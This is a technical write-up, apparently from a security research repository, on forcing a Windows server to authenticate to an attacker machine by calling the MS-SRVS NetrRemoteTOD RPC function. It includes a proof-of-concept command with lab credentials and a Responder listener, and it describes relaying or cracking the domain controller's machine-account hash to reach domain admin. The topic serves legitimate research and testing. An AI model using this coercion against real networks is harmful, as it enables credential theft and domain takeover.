# MS-SRVS - Remote call to NetrRemoteTOD (opnum 28)

## Summary

 - **Protocol**: [[MS-SRVS]: Server Service Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9)

 - **Protocol UUID**: 4b324fc8-1670-01d3-1278-5a47bf6ee188

 - **Protocol version**: 3.0

 - **SMB Named pipe**: `\PIPE\srvsvc`

 - **Function name**: [`NetrRemoteTOD`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/6e914f10-3280-474e-81fa-71621d5c3409)

 - **Function operation number**: `28`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\srvsvc` and bind to the desired [`MS-SRVS`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9) protocol (with uuid `4b324fc8-1670-01d3-1278-5a47bf6ee188` and version `3.0`) in order to perform remote procedure calls to functions in the [`MS-SRVS`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\srvsvc` This pipe is connected to the protocol [[MS-SRVS]: Server Service Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9) and allows to call RPC functions of this protocol. We will then call the remote [`NetrRemoteTOD`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/6e914f10-3280-474e-81fa-71621d5c3409) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
NetrRemoteTOD('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
NET_API_STATUS NetrRemoteTOD(
   [in, string, unique] SRVSVC_HANDLE ServerName,
   [out] LPTIME_OF_DAY_INFO* BufferPtr
 );
```

## References

 - Documentation of protocol [MS-SRVS]: Server Service Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9

 - Documentation of function `NetrRemoteTOD`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/6e914f10-3280-474e-81fa-71621d5c3409